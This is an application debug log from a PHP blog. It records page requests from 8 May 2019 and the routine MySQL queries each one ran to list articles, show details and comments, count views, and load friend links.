[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000528s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000400s ]
---------------------------------------------------------------
[2019-05-08T12:51:45+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001163s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001936s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000388s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001420s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000404s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001417s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000485s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000381s ]
---------------------------------------------------------------
[2019-05-08T14:45:46+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001292s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.104390s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000439s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001649s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000427s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002152s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000535s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000646s ]
---------------------------------------------------------------
[2019-05-08T15:18:45+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001129s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001795s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000498s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001549s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000402s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001622s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000466s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000399s ]
---------------------------------------------------------------
[2019-05-08T17:18:15+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001048s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001915s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000465s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001613s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000411s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001620s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000521s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000455s ]
---------------------------------------------------------------
[2019-05-08T17:18:16+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001116s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002017s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000526s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.008275s ]
---------------------------------------------------------------
[2019-05-08T17:18:20+08:00] 172.18.0.2 GET blog/detail/index?id=12
[ sql ] [ DB ] CONNECT:[ UseTime:0.002382s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.004215s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`cont`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type_id`,`type` FROM `article` `a` WHERE  `is_delete` = 0  AND `id` = 12 LIMIT 1 [ RunTime:0.039841s ]
[ sql ] [ SQL ] UPDATE `article`  SET `see_num` = `see_num` + 1  WHERE  `is_delete` = 0  AND `id` = 12 [ RunTime:0.084684s ]
---------------------------------------------------------------
[2019-05-08T17:18:20+08:00] 172.18.0.2 GET blog/detail/getArgue?id=12
[ sql ] [ DB ] CONNECT:[ UseTime:0.000953s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_argue` [ RunTime:0.001861s ]
[ sql ] [ SQL ] SELECT * FROM `article_argue` WHERE  `article_id` = 12  AND `is_delete` = 0 [ RunTime:0.004945s ]
---------------------------------------------------------------
[2019-05-08T17:18:21+08:00] 172.18.0.2 GET blog/index/list?type=1&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001587s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001951s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 1  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.016954s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 1  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.001566s ]
---------------------------------------------------------------
[2019-05-08T17:18:21+08:00] 172.18.0.2 GET blog/index/list?type=2&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001313s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002220s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 2  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000509s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 2  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.001070s ]
---------------------------------------------------------------
[2019-05-08T17:18:22+08:00] 172.18.0.2 GET blog/index/list?type=3&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001722s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002602s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 3  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000715s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 3  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000902s ]
---------------------------------------------------------------
[2019-05-08T17:18:23+08:00] 172.18.0.2 GET blog/index/list?type=4&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001110s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002983s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 4  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000717s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 4  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.001168s ]
---------------------------------------------------------------
[2019-05-08T17:18:28+08:00] 172.18.0.2 GET blog/detail/index?id=3
[ sql ] [ DB ] CONNECT:[ UseTime:0.001015s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002031s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`cont`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type_id`,`type` FROM `article` `a` WHERE  `is_delete` = 0  AND `id` = 3 LIMIT 1 [ RunTime:0.000516s ]
[ sql ] [ SQL ] UPDATE `article`  SET `see_num` = `see_num` + 1  WHERE  `is_delete` = 0  AND `id` = 3 [ RunTime:0.000425s ]
---------------------------------------------------------------
[2019-05-08T17:18:28+08:00] 172.18.0.2 GET blog/detail/getArgue?id=3
[ sql ] [ DB ] CONNECT:[ UseTime:0.001008s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_argue` [ RunTime:0.001958s ]
[ sql ] [ SQL ] SELECT * FROM `article_argue` WHERE  `article_id` = 3  AND `is_delete` = 0 [ RunTime:0.000419s ]
---------------------------------------------------------------
[2019-05-08T17:18:29+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.000988s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001781s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000491s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000608s ]
---------------------------------------------------------------
[2019-05-08T17:26:40+08:00] 172.18.0.2 GET blog/detail/index?id=21
[ sql ] [ DB ] CONNECT:[ UseTime:0.001397s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002404s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`cont`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type_id`,`type` FROM `article` `a` WHERE  `is_delete` = 0  AND `id` = 21 LIMIT 1 [ RunTime:0.000626s ]
---------------------------------------------------------------
[2019-05-08T17:34:05+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001298s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002590s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000493s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001844s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000507s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001857s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000691s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000640s ]
---------------------------------------------------------------
[2019-05-08T17:34:07+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001799s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001906s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000533s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000740s ]
---------------------------------------------------------------
[2019-05-08T17:34:19+08:00] 172.18.0.2 GET blog/index/list?type=2&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001403s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002145s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 2  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000475s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 2  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000632s ]
---------------------------------------------------------------
[2019-05-08T17:34:21+08:00] 172.18.0.2 GET blog/index/list?type=3&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001207s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002259s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 3  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000644s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 3  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.002660s ]
---------------------------------------------------------------
[2019-05-08T17:34:22+08:00] 172.18.0.2 GET blog/index/list?type=4&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001261s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002449s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 4  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000780s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 4  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000619s ]
---------------------------------------------------------------
[2019-05-08T17:34:23+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001071s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001918s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000541s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000587s ]
---------------------------------------------------------------
[2019-05-08T18:34:27+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001261s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002140s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000453s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001674s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000444s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002332s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000575s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000567s ]
---------------------------------------------------------------
[2019-05-08T18:41:50+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001221s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001812s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000461s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001421s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000596s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000396s ]
---------------------------------------------------------------
[2019-05-08T18:45:16+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001242s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002388s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000562s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001812s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000524s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002496s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000646s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000901s ]
---------------------------------------------------------------
[2019-05-08T18:46:48+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001120s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001793s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000445s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001505s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000483s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000400s ]
---------------------------------------------------------------
[2019-05-08T18:57:18+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001191s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002249s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000446s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001619s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000529s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001789s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000540s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000468s ]
---------------------------------------------------------------
[2019-05-08T19:18:24+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001116s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002000s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000412s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001428s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000384s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001414s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000429s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000383s ]
---------------------------------------------------------------
[2019-05-08T20:00:03+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001514s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002413s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000933s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001970s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000521s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001907s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000544s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000855s ]
---------------------------------------------------------------
[2019-05-08T20:50:58+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000967s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001598s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000404s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001507s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000390s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001306s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000411s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000360s ]
---------------------------------------------------------------
[2019-05-08T20:58:02+08:00] 172.18.0.2 POST blog/index.php
[ sql ] [ DB ] CONNECT:[ UseTime:0.001268s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002673s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000527s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002070s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000564s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000552s ]
---------------------------------------------------------------
[2019-05-08T20:58:04+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001352s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002246s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000584s ]
---------------------------------------------------------------
[2019-05-08T20:58:05+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001108s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002036s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000747s ]
---------------------------------------------------------------
[2019-05-08T20:58:06+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001651s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002458s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000621s ]
---------------------------------------------------------------
[2019-05-08T20:58:08+08:00] 172.18.0.2 GET blog/index.php
[ sql ] [ DB ] CONNECT:[ UseTime:0.001135s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001892s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000549s ]
---------------------------------------------------------------
[2019-05-08T22:01:31+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001437s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002770s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000711s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001586s ]
